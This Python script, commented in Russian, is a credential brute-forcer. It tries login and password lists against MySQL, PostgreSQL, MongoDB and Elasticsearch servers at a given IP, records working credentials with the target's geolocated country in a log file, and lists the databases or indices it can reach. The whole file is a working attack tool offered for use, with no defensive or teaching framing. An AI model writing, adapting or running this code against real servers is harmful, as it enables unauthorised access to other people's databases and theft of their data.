#!/usr/bin/python3
# -*- coding: utf-8 -*-
# from geoip import geolite2   # дополнительно pip install python-geoip-geolite2
import geoip2.database
import pymysql
from pymysql.cursors import DictCursor
from contextlib import closing
from pymongo import MongoClient
from elasticsearch import Elasticsearch
import os
import sys
import psycopg2
import logging

# запись в логи ip  и страны
def logALL(ip,g_db):
    reader = geoip2.database.Reader(g_db)
    with open("log.txt", 'a+') as outfile:
        outfile.write("\n");  outfile.write("-"*20);  outfile.write("\n")  
        outfile.write("ip: ");  outfile.write("".join(str(ip)));  outfile.write("\n") 
        try:
            response = reader.city(ip)
            # match = geolite2.lookup(ip) # использование БД из сети - локально работает, на другой машине нет
            # print(match.country)
            outfile.write("country: ");  outfile.write("".join(str(response.country.name)));  outfile.write("\n")
            print(response.country.name)
        except:
            outfile.write("Could not find out the country\n")
        
# запись в логи логина/пароля
def loggingLogPass(login,password):
        with open("log.txt", 'a+') as outfile:                
            outfile.write("".join(str(login)));  outfile.write(":");  outfile.write("".join(str(password))); outfile.write("\n")

# запись в логи названий бд на сервере
def loggingDB(db):
    with open("log.txt", 'a+') as outfile:                      
        outfile.write("".join(str(db)))
        outfile.write("\n")

# брут mysql
def Main_1(ip,port,logins_list,password_list):
    for login in logins_list:
        for password in password_list:
            try:

                connect = pymysql.connect(
                    host=ip,
                    user=login,
                    password=password,
                    charset='utf8mb4',
                    cursorclass=DictCursor,
                    autocommit=True
                )

                loggingLogPass(login,password)
                with connect.cursor() as cursor:
                    query = "SHOW databases"
                    cursor.execute(query)
                    rows = cursor.fetchall()
                    for row in rows:
                        q=row['Database']
                        print(q)	
                        loggingDB(q)
                print("login: {} -- password {}".format(login, password))
            except:
                print("No hacking")

# брут postresql
def Main_2(ip,port,logins_list,password_list):

    for login in logins_list:
        for password in password_list:
            try:

                connect = psycopg2.connect(
                    host=ip,
                    user=login,
                    password=password,
                    port=port
                )

                loggingLogPass(login,password)
                with connect.cursor() as cursor:
                    query = "select * from pg_database;"
                    cursor.execute(query)
                    connect.commit()  
                    rows = cursor.fetchall()
                    for row in rows:
                        q=row[0]	
                        print(q)
                        loggingDB(q)
                        # print(q)
                print("login: {} -- password {}".format(login, password))
            except:
                print("No hacking")

# брут mongodb
def Main_3(ip,port,logins_list,password_list):
    for login in logins_list:
        for password in password_list:
            try:

                client = MongoClient(ip,port)
                try:
                    auth = client.admin.authenticate(login,password)
                    loggingLogPass(login,password)
                except:
                    pass


                for db in client.list_databases():
                    q=db['name']
                    # print(q)
                    print(q)
                    loggingDB(q)
                # print("login: {} -- password {}".format(login, password))
            except:
                print("No hacking")

# брут elasticsearch
def Main_4(ip,port,logins_list,password_list):
    for login in logins_list:
        for password in password_list:
            try:

                es = Elasticsearch([{'host': ip, 'port': port}])
                # if es.ping():
                #     print('Yay Connect')
                # else:
                #     print('Awww it could not connect!')
                for index in es.indices.get('*'):
                    print(index)
                    loggingDB(index)

                # loggingLogPass(login,password)
                # print("login: {} -- password {}".format(login, password))
            except:
                print("No hacking")